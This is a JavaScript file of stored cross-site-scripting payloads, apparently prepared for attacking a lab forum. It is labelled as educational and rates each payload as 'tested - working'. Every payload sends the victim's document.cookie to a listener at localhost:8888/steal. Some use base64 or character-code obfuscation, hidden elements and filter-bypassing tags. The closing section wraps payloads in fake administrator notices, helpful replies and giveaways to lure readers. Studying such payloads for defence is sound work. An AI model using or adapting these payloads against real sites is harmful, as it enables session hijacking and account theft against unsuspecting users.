// ⚠️ WARNING: These are MALICIOUS scripts for educational purposes only!

// ============================================================
// ⭐⭐⭐ TOP 3 BEST PAYLOADS (TESTED - WORKING!) ⭐⭐⭐
// ============================================================

// 🥇 BEST - Invisible, immediate
const BEST_PAYLOAD = `Great post! 👍<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)" style="display:none">`;

// 🥈 Simplest - Immediate, visible failed image
const SIMPLE_PAYLOAD = `Great news! The issue has been fixed 🎉<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">`;

// 🥉 SVG - Very effective, often bypasses filters
const SVG_PAYLOAD = `New feature on the forum!<svg/onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)"></svg>`;

// ============================================================
// PAYLOAD 1: Basic Image Tag with onerror
// ============================================================
// Scenario: Post looks like a normal message with emoji
// Impact: HIGH - Executes immediately when page loads
// Stealth: MEDIUM - Text looks normal, but source contains <img>
// STATUS: ✅ WORKS (after adding | safe to template)

const PAYLOAD_1 = `Great news! The login issue has been fixed 🎉<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">`;

// ============================================================
// PAYLOAD 2: Link with onmouseover
// ============================================================
// Scenario: "Helpful" link to an article
// Impact: HIGH - Activates even on mouse hover
// Stealth: HIGH - Looks like a normal link
// STATUS: ✅ WORKS (requires mouse hover)

const PAYLOAD_2 = `I recommend this security article: <a href="#" onmouseover="new Image().src='http://localhost:8888/steal?cookie='+document.cookie">Click here</a>`;

// ============================================================
// PAYLOAD 3: SVG with onload
// ============================================================
// Scenario: Adding an "icon" to the post
// Impact: HIGH - SVG onload executes automatically
// Stealth: VERY HIGH - SVG often bypassed by filters
// STATUS: ✅ WORKS (immediate, very effective)

const PAYLOAD_3 = `New feature on the forum! <svg/onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)"></svg>`;

// ============================================================
// PAYLOAD 4: Script Tag with Base64 Obfuscation
// ============================================================
// Scenario: "System test" - admins often publish such things
// Impact: HIGH - eval() executes decoded code
// Stealth: VERY HIGH - Base64 hides true intentions
// Decoded: fetch('http://localhost:8888/steal?cookie='+document.cookie)
// STATUS: ✅ WORKS (if CSP doesn't block)

const PAYLOAD_4 = `System test... <script>eval(atob('ZmV0Y2goJ2h0dHA6Ly9sb2NhbGhvc3Q6ODg4OC9zdGVhbD9jb29raWU9Jytkb2N1bWVudC5jb29raWUp'))</script>`;

// ============================================================
// PAYLOAD 5: Iframe with JavaScript URL
// ============================================================
// Scenario: Embedding "video" or external content
// Impact: MEDIUM - Requires iframe support by browser
// Stealth: HIGH - Invisible iframe (display:none)

const PAYLOAD_5 = `Check out the latest tutorial: <iframe src="javascript:parent.location='http://localhost:8888/steal?cookie='+document.cookie" style="display:none"></iframe>`;

// ============================================================
// PAYLOAD 6: Body Tag with onload
// ============================================================
// Scenario: Welcome message
// Impact: HIGH - Body onload executes on page load
// Stealth: LOW - Body tag in post is suspicious

const PAYLOAD_6 = `Welcome! <body onload="new Image().src='http://localhost:8888/steal?c='+document.cookie"></body>`;

// ============================================================
// PAYLOAD 7: Details Tag with ontoggle
// ============================================================
// Scenario: "FAQ" with expandable content
// Impact: HIGH - ontoggle activates automatically (open attribute)
// Stealth: VERY HIGH - HTML5 tag rarely filtered

const PAYLOAD_7 = `FAQ: <details open ontoggle="fetch('http://localhost:8888/steal?cookie='+document.cookie)"><summary>Click to expand</summary>Content...</details>`;

// ============================================================
// PAYLOAD 8: Meta Refresh with JavaScript URL
// ============================================================
// Scenario: Page update warning
// Impact: HIGH - Meta refresh executes automatically
// Stealth: MEDIUM - May be detected by meta tag filters

const PAYLOAD_8 = `The page will be updated soon <meta http-equiv="refresh" content="0;url=javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)">`;

// ============================================================
// PAYLOAD 9: Input with autofocus and onfocus
// ============================================================
// Scenario: Survey or feedback form
// Impact: HIGH - autofocus triggers onfocus automatically
// Stealth: HIGH - Looks like an interactive element

const PAYLOAD_9 = `Fill out the survey: <input autofocus onfocus="new Image().src='http://localhost:8888/steal?cookie='+document.cookie" placeholder="Your answer">`;

// ============================================================
// PAYLOAD 10: Video Tag with onerror
// ============================================================
// Scenario: Sharing "recording" from an event
// Impact: HIGH - Video onerror executes when src fails to load
// Stealth: HIGH - Media tags commonly used on forums

const PAYLOAD_10 = `Recording from the conference: <video src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)"></video>`;

// ============================================================
// ADVANCED PAYLOADS - More advanced techniques
// ============================================================

// PAYLOAD 11: Multiple Encoding (Hex + Decimal)
const PAYLOAD_11 = `<img src=x onerror="eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,108,111,99,97,108,104,111,115,116,58,56,56,56,56,47,115,116,101,97,108,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))">`;

// PAYLOAD 12: Comment Tag Confusion
const PAYLOAD_12 = `Pomóżcie z tym problemem:
<!--<script>-->
<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">
<!--</script>-->`;

// PAYLOAD 13: Markdown-style Link (if forum supports markdown)
const PAYLOAD_13 = `[Click here](javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie))`;

// PAYLOAD 14: Object/Embed Tag
const PAYLOAD_14 = `<object data="javascript:fetch('http://localhost:8888/steal?cookie='+document.cookie)"></object>`;

// PAYLOAD 15: Form with auto-submit
const PAYLOAD_15 = `<form action="http://localhost:8888/steal" method="GET">
<input type="hidden" name="cookie" id="cookieField">
<script>document.getElementById('cookieField').value=document.cookie;this.form.submit();</script>
</form>`;

// ============================================================
// STEALTHY PAYLOADS - Maximum concealment
// ============================================================

// PAYLOAD 16: Zero-width characters + Unicode
const PAYLOAD_16 = `Great post!​<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)" style="display:none">`;

// PAYLOAD 17: CSS-based obfuscation
const PAYLOAD_17 = `<style>img{display:none}</style><img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)">Interesting discussion!`;

// PAYLOAD 18: Data URI with Base64
const PAYLOAD_18 = `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImZldGNoKCdodHRwOi8vbG9jYWxob3N0Ojg4ODgvc3RlYWw/Y29va2llPScrZG9jdW1lbnQuY29va2llKSIvPg==">`;

// ============================================================
// SOCIAL ENGINEERING SCENARIOS
// ============================================================

// Scenario: Administrator announcement
const ADMIN_ANNOUNCEMENT = `🔔 IMPORTANT ANNOUNCEMENT FROM ADMINISTRATOR

Dear user,

We are performing a forum security update. Please be patient.

Thank you!
<img src=x onerror="fetch('http://localhost:8888/steal?cookie='+document.cookie)" style="display:none">

- PCYB Forum Team`;

// Scenario: Helpful troubleshooting
const HELPFUL_USER = `I had the same problem! I solved it this way:

1. Log out of your account
2. Clear browser cache
3. Log in again

Hope this helps! 😊
<svg/onload="fetch('http://localhost:8888/steal?cookie='+document.cookie)"></svg>`;

// Scenario: Competition/Giveaway
const GIVEAWAY = `🎁 CONTEST! 🎁

The first 10 people who reply to this post will receive free Premium access for a month!

<details open ontoggle="new Image().src='http://localhost:8888/steal?cookie='+document.cookie">
<summary>Click to participate</summary>
Congratulations! You are now a contest participant!
</details>`;

